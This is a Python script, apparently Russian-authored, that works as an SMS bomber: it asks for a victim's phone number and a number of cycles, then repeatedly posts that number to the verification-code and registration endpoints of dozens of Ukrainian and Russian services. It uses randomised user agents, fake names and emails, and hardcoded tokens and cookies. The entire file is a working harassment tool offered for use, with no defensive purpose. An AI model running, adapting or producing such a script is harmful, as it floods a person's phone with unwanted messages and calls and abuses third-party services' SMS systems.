import requests, random, os, json, re
from user_agent import generate_user_agent
from colorama import Fore, Style
from text import *


os.system("clear")
nice = Fore.YELLOW + Style.BRIGHT + "[+] " + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT
fail = Fore.YELLOW + Style.BRIGHT + "[-] " + Style.RESET_ALL + Fore.RED + Style.BRIGHT


def check_number():
    global phone
    try:
        phone = re.sub("[^0-9]", "", phone)  # оставляет только цифры
        if phone.startswith("0") or phone.startswith("+", 1):
            phone = "38" + phone
        elif phone == "" or phone == "79271703628":
            print(
                Fore.RED + Style.BRIGHT + "Номер введён некорректно!" + Style.RESET_ALL
            )
            exit()
    except Exception:
        print(Fore.RED + Style.BRIGHT + "Номер введён некорректно!" + Style.RESET_ALL)
        exit()


def generate_info():
    global _name
    global _email
    global password
    global username
    global _russian
    _russian = "".join(
        [
            random.choice(
                "йцукенгшщзхъфывапролджэячмитьбюЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ"
            )
            for x in range(8)
        ]
    )
    _name = "".join(
        [
            random.choice(
                "1234567890abcdefghigklmnopqrstuvyxwzABCDEFGHIGKLMNOPQRSTUVYXWZ"
            )
            for x in range(8)
        ]
    )
    password = "".join(
        [
            random.choice(
                "1234567890abcdefghigklmnopqrstuvyxwzABCDEFGHIGKLMNOPQRSTUVYXWZ"
            )
            for x in range(11)
        ]
    )
    username = "".join(
        [random.choice("1234567890abcdefghigklmnopqrstuvyxwz") for x in range(8)]
    )
    _email = (
        "".join(
            [random.choice("1234567890abcdefghigklmnopqrstuvyxwz") for x in range(8)]
        )
        + "@gmail.com"
    )


head = {
    "User-Agent": generate_user_agent(device_type="desktop", os=("mac", "linux")),
    "X-Requested-With": "XMLHttpRequest",
}


def start():
    print(
        Fore.BLUE
        + Style.BRIGHT
        + f"\nНомер: {phone}\nЦиклы: {count}"
        + "\nСпамер запущен.\nЕсли Вы хотите остановить - нажмите Ctrl+Z."
        + Style.RESET_ALL
    )
    global iteration
    iteration = 0
    while iteration < count:
        try:
            requests.post(
                "https://uklon.com.ua/api/v1/account/code/send",
                headers={
                    "client_id": "6289de851fc726f887af8d5d7a56c635",
                    "User-Agent": generate_user_agent(
                        device_type="desktop", os=("mac", "linux")
                    ),
                    "X-Requested-With": "XMLHttpRequest",
                },
                json={"phone": phone},
                timeout=2,
            )
            requests.post(
                "https://partner.uklon.com.ua/api/v1/registration/sendcode",
                headers={
                    "client_id": "6289de851fc726f887af8d5d7a56c635",
                    "User-Agent": generate_user_agent(
                        device_type="desktop", os=("mac", "linux")
                    ),
                    "X-Requested-With": "XMLHttpRequest",
                },
                json={"phone": phone},
                timeout=2,
            )
            print(nice + "Uklon отправлен!" + Style.RESET_ALL)
        except:
            print(fail + "Uklon не отправлен!" + Style.RESET_ALL)
        try:
            requests.post(
                "https://www.moyo.ua/identity/registration",
                data={"firstname": "Олег", "phone": phone, "email": _email,},
                headers=head,
                timeout=2,
            )
            print(nice + "MOYO отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "MOYO не отправлено!" + Style.RESET_ALL)
        try:
            requests.post(
                "https://koronapay.com/transfers/online/api/users/otps",
                data={"phone": phone,},
                headers=head,
                timeout=2,
            )
            print(nice + "KoronoPay отправлен!" + Style.RESET_ALL)
        except:
            print(fail + "KoronoPay не отправлен!" + Style.RESET_ALL)
        try:
            frisor = {
                "Content-type": "application/json",
                "Accept": "application/json, text/plain",
                "authorization": "Bearer yusw3yeu6hrr4r9j3gw6",
                "User-Agent": generate_user_agent(
                    device_type="desktop", os=("mac", "linux")
                ),
                "cookie": "auth=vov0ptt2rlhni0ten4n9kh5q078l0dm5elp904lq6ncsfmac0md8i8bcmqilk8u3; lang=1; yc_vid=97527048909; yc_firstvisit=1589271208; _ym_uid=1589271210161580972; _ym_d=1589271210; _ga=GA1.2.2045789867.1589271211; _gid=GA1.2.807235883.1589271211; _ym_visorc_35239280=b; _ym_isad=2; _gat_gtag_UA_68406331_1=1",
            }
            requests.post(
                "https://n13423.yclients.com/api/v1/book_code/312054",
                data=json.dumps({"phone": phone}),
                headers=frisor,
                timeout=2,
            )
            # 1 раз в минуту
            print(nice + "Frizor отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Frizor не отправлен" + Style.RESET_ALL)
        try:
            requests.post(
                "https://kasta.ua/api/v2/login/", data={"phone": phone}, timeout=2
            )
            print(nice + "Kasta отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Kasta не отправлен" + Style.RESET_ALL)
        try:
            requests.post(
                "https://izi.ua/api/auth/register",
                json={
                    "phone": "+" + phone,
                    "name": _russian,
                    "is_terms_accepted": "true",
                },
                headers=head,
                timeout=2,
            )
            print(nice + "IZI отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "IZI не отправлен" + Style.RESET_ALL)
        try:
            requests.post(
                "https://junker.kiev.ua/postmaster.php",
                data={"tel": phone[2:], "name": _name, "action": "callme",},
                timeout=2,
            )
            print(nice + "Junker Kiev отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Junker Kiev не отправлен" + Style.RESET_ALL)
        try:
            requests.post(
                "https://allo.ua/ua/customer/account/createPostVue/?currentTheme=main&currentLocale=uk_UA",
                data={
                    "firstname": _russian,
                    "telephone": phone,
                    "email": _email,
                    "password": password,
                    "form_key": "Zqqj7CyjkKG2ImM8",
                },
                headers=head,
                timeout=2,
            )
            print(nice + "Allo отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Allo не отправлен" + Style.RESET_ALL)
        try:
            requests.post(
                "https://stores-api.zakaz.ua/user/signup/",
                json={"phone": phone},
                headers={
                    "Accept": "*/*",
                    "Content-Type": "application/json",
                    "Referer": "https://megamarket.zakaz.ua/ru/products/megamarket00000000122023/sausages-farro/",
                    "User-Agent": generate_user_agent(
                        device_type="desktop", os=("mac", "linux")
                    ),
                    "x-chain": "megamarket",
                },
            )
            print(nice + "Zakaz.ua отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Zakaz.ua не отправлен" + Style.RESET_ALL)
        try:
            requests.post(
                "https://youla.ru/web-api/auth/request_code",
                data={"phone": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "Youla отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Youla не отправлен" + Style.RESET_ALL)
        try:
            requests.post(
                "https://cloud.mail.ru/api/v2/notify/applink",
                json={
                    "phone": "+" + phone,
                    "api": 2,
                    "email": _email,
                    "x-email": "x-email",
                },
                headers=head,
                timeout=2,
            )
            print(nice + "MailRu Cloud отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "MailRu Cloud не отправлен" + Style.RESET_ALL)
        try:
            requests.post(
                "https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru",
                data={"phone": phone},
                headers=head,
                timeout=2,
            )
            requests.post(
                f"https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+{phone}",
                headers=head,
                timeout=2,
            )
            print(nice + "BELTELECOM3 отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "BELTELECOM3 не отправлен" + Style.RESET_ALL)
        try:
            requests.post(
                "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
                data={"phone_number": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "Tinder отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Tinder не отправлен" + Style.RESET_ALL)
        try:
            requests.post(
                "https://crm.getmancar.com.ua/api/veryfyaccount",
                json={
                    "phone": "+" + phone,
                    "grant_type": "password",
                    "client_id": "gcarAppMob",
                    "client_secret": "SomeRandomCharsAndNumbersMobile",
                },
                headers=head,
                timeout=2,
            )
            print(nice + "Getmancar отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Getmancar не отправлен" + Style.RESET_ALL)
        try:
            requests.post(
                "https://www.icq.com/smsreg/requestPhoneValidation.php",
                data={
                    "msisdn": phone,
                    "locale": "en",
                    "countryCode": "ru",
                    "version": "1",
                    "k": "ic1rtwz1s1Hj1O0r",
                    "r": "46763",
                },
                headers=head,
                timeout=2,
            )
            print(nice + "ICQ отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "ICQ не отправлен" + Style.RESET_ALL)
        try:
            requests.post(
                "https://api.pozichka.ua/v1/registration/send",
                json={"RegisterSendForm": {"phone": "+" + phone}},
                headers=head,
                timeout=2,
            )
            print(nice + "Pozichka отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Pozichka не отправлен" + Style.RESET_ALL)
        try:
            requests.post(
                f"https://secure.online.ua/ajax/check_phone/?reg_phone={phone}",
                headers=head,
                timeout=2,
            )
            print(nice + "SecureOnline отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "SecureOnline не отправлен" + Style.RESET_ALL)
        try:
            requests.post(
                "https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+{}".format(
                    phone
                ),
                headers=head,
                timeout=2,
            )
            print(nice + "SportMaster отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "SportMaster не отправлен" + Style.RESET_ALL)
        try:
            requests.post(
                "https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper",
                params={"oper": 9, "callmode": 1, "phone": "+" + phone},
                headers=head,
                timeout=2,
            )
            print(nice + "Звонок отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Звонок не отправлен" + Style.RESET_ALL)
        try:
            requests.post(
                "https://city24.ua/personalaccount/account/registration",
                data={"PhoneNumber": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "City24 отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "City24 не отправлено" + Style.RESET_ALL)
        try:
            requests.post(
                "https://helsi.me/api/healthy/accounts/login",
                json={"phone": phone, "platform": "PISWeb"},
                headers=head,
                timeout=2,
            )
            print(nice + "Helsi отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Helsi не отправлено" + Style.RESET_ALL)
        try:
            requests.post(
                "https://cloud.mail.ru/api/v2/notify/applink",
                json={"phone": "+" + phone, "api": 2, "email": _email},
                headers=head,
                timeout=2,
            )
            print(nice + "CloudMail отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "CloudMail не отправлено" + Style.RESET_ALL)
        try:
            requests.post(
                "https://auth.multiplex.ua/login",
                json={"login": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "Multiplex отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Multiplex не отправлено" + Style.RESET_ALL)
        try:
            requests.post(
                "https://account.my.games/signup_send_sms/",
                data={"phone": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "MyGames отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "MyGames не отправлено" + Style.RESET_ALL)
        try:
            requests.get(
                "https://cabinet.planetakino.ua/service/sms",
                params={"phone": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "Planetakino отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Planetakino не отправлено" + Style.RESET_ALL)
        try:
            requests.post(
                "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
                data={"phone_number": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "Tinder отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Tinder не отправлено" + Style.RESET_ALL)
        try:
            requests.post(
                "https://youla.ru/web-api/auth/request_code",
                data={"phone": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "Youla отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Youla не отправлено" + Style.RESET_ALL)
        try:
            requests.post(
                "https://rutube.ru/api/accounts/sendpass/phone",
                data={"phone": "+" + phone},
                headers=head,
                timeout=2,
            )
            print(nice + "LiST отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "LiST не отправлено" + Style.RESET_ALL)
        try:
            requests.post(
                "https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",
                params={"pageName": "registerPrivateUserPhoneVerificatio"},
                data={"phone": phone, "recaptcha": "off", "g-recaptcha-response": ""},
                headers=head,
                timeout=2,
            )
            print(nice + "MVideo отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "MVideo не отправлено" + Style.RESET_ALL)
        try:
            requests.post(
                "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
                data={"phone_number": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "Tinder отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Tinder не отправлено" + Style.RESET_ALL)
        try:
            requests.post(
                "https://passport.twitch.tv/register?trusted_request=true",
                json={
                    "birthday": {"day": 11, "month": 11, "year": 1999},
                    "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
                    "include_verification_code": True,
                    "password": password,
                    "phone_number": phone,
                    "username": username,
                },
                headers=head,
                timeout=2,
            )
            print(nice + "Twitch отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Twitch не отправлено" + Style.RESET_ALL)
        try:
            requests.post(
                "https://lk.belkacar.ru/register",
                data={"phone": "+" + phone},
                headers=head,
                timeout=2,
            )
            print(nice + "BelkaCar отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "BelkaCar не отправлено" + Style.RESET_ALL)
        try:
            requests.post(
                "https://api.ivi.ru/mobileapi/user/register/phone/v6",
                data={"phone": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "IVI отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "IVI не отправлено" + Style.RESET_ALL)
        try:
            requests.post(
                "https://www.sportmaster.ua/",
                params={"module": "users", "action": "SendSMSReg", "phone": phone},
                headers=head,
                timeout=2,
            )
            requests.post(
                "https://lk.belkacar.ru/get-confirmation-code",
                data={"phone": "+" + phone},
                headers=head,
                timeout=2,
            )
            print(nice + "SportMaster, BelkaCar отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "SportMaster не отправлено" + Style.RESET_ALL)
        try:
            requests.post(
                "https://secure.online.ua/ajax/check_phone/",
                params={"reg_phone": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "SecureOnline отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "SecureOnline не отправлено" + Style.RESET_ALL)
        try:
            requests.post(
                "https://www.nl.ua",
                data={
                    "component": "bxmaker.authuserphone.login",
                    "sessid": "bf70db951f54b837748f69b75a61deb4",
                    "method": "sendCode",
                    "phone": phone,
                    "registration": "N",
                },
                headers=head,
                timeout=2,
            )
            print(nice + "NovaLiniya отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "NovaLiniya не отправлено" + Style.RESET_ALL)
        try:
            requests.post(
                "https://mobileplanet.ua/register",
                data={
                    "klient_name": _name,
                    "klient_phone": "+" + phone,
                    "klient_email": _email,
                },
                headers=head,
                timeout=2,
            )
            print(nice + "MPlanet отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "MPlanet не отправлено" + Style.RESET_ALL)
        try:
            requests.post(
                "https://api.delitime.ru/api/v2/signup",
                data={"SignupForm[username]": phone, "SignupForm[device_type]": 3},
                headers=head,
                timeout=2,
            )
            print(nice + "DELIMOBIL отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "DELIMOBIL не отправлено" + Style.RESET_ALL)
        try:
            requests.post(
                "https://apteka366.ru/login/register/sms/send",
                data={"phone": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "Apteka 366 отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Apteka 366 не отправлено" + Style.RESET_ALL)
        try:
            requests.post(
                "https://belkacar.ru/get-confirmation-code",
                data={"phone": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "Belkacar отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Belkacar не отправлено" + Style.RESET_ALL)
        try:
            requests.post(
                "https://drugvokrug.ru/siteActions/processSms.html",
                data={"cell": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "Друг Вокруг отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Друг Вокруг не отправлено" + Style.RESET_ALL)
        try:
            requests.post(
                "https://api.ennergiia.com/auth/api/development/lor",
                json={"referrer": "ennergiia", "phone": "+" + phone},
                headers=head,
                timeout=2,
            )
            print(nice + "Energiia oтправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Energiia не отправлено" + Style.RESET_ALL)
        try:
            requests.get(
                "https://fundayshop.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp?type=sendConfirmCode&phoneNumber={}".format(
                    "+" + phone
                ),
                headers=head,
                timeout=2,
            )
            print(nice + "Fundayshop oтправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Fundayshop не отправлено" + Style.RESET_ALL)
        try:
            requests.post(
                "https://gorzdrav.org/login/register/sms/send",
                data={"phone": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "Gorzdrav oтправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Gorzdrav не отправлено" + Style.RESET_ALL)
        try:
            requests.post(
                "https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
                data={"phone": "+" + phone},
                headers=head,
                timeout=2,
            )
            print(nice + "KFC отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "KFC не отправлено" + Style.RESET_ALL)
        try:
            requests.post(
                "https://api-production.viasat.ru/api/v1/auth_codes",
                json={"msisdn": "+" + phone},
                headers=head,
                timeout=2,
            )
            print(nice + "Viasat отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Viasat не отправлено" + Style.RESET_ALL)
        try:
            requests.post(
                "https://eda.yandex/api/v1/user/request_authentication_code",
                json={"phone_number": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "Yandex Food отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Yandex Food не отправлено" + Style.RESET_ALL)
        try:
            requests.post(
                f"https://www.citilink.ru/registration/confirm/phone/+{phone}/",
                headers=head,
                timeout=2,
            )
            print(nice + "Сitilink отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Сitilink не отправлено" + Style.RESET_ALL)
        try:
            requests.post(
                "https://eda.yandex/api/v1/user/request_authentication_code",
                json={"phone_number": "+" + phone},
                headers=head,
                timeout=2,
            )
            print(nice + "Yandex Eda отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Yandex Eda не отправлено" + Style.RESET_ALL)
        try:
            requests.post(
                "https://my.dianet.com.ua/send_sms/",
                headers=head,
                data={"phone": phone},
                timeout=2,
            )
            print(nice + "Dianet отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Dianet не отправлено" + Style.RESET_ALL)
        try:
            requests.get(
                "https://api.eldorado.ua/v1/sign/",
                params={
                    "login": phone,
                    "step": "phone-check",
                    "fb_id": "null",
                    "fb_token": "null",
                    "lang": "ru",
                },
                headers=head,
                timeout=2,
            )
            print(nice + "Eldorado отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Eldorado не отправлено" + Style.RESET_ALL)
        try:
            requests.post(
                "https://shafa.ua/api/v3/graphiql",
                json={
                    "operationName": "RegistrationSendSms",
                    "variables": {"phoneNumber": "+" + phone},
                    "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",
                },
                headers=head,
                timeout=2,
            )
            print(nice + "Shafa отправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Shafa не отправлено" + Style.RESET_ALL)
        iteration += 1
        print(
            Fore.CYAN
            + Style.BRIGHT
            + (f"\n{iteration} круг пройден.\n")
            + Style.RESET_ALL
        )
    os.system("clear")


def menu():
    print(Fore.CYAN + Style.BRIGHT + "Введите номер:" + Style.RESET_ALL)
    global phone
    phone = input(cursor + Style.RESET_ALL)
    check_number()
    print(Fore.CYAN + Style.BRIGHT + "Введите количество циклов:" + Style.RESET_ALL)
    global count
    count = input(cursor + Style.RESET_ALL)
    count = int(count)
    os.system("clear")
    generate_info()
    print(banner)
    start()
    print(banner)
    print(
        Fore.YELLOW
        + Style.BRIGHT
        + f"\nГотово.\nТелефон: {phone}\nКол-во пройденных циклов: {iteration}"
        + Style.RESET_ALL
    )


if __name__ == "__main__":
    print(banner)
    menu()
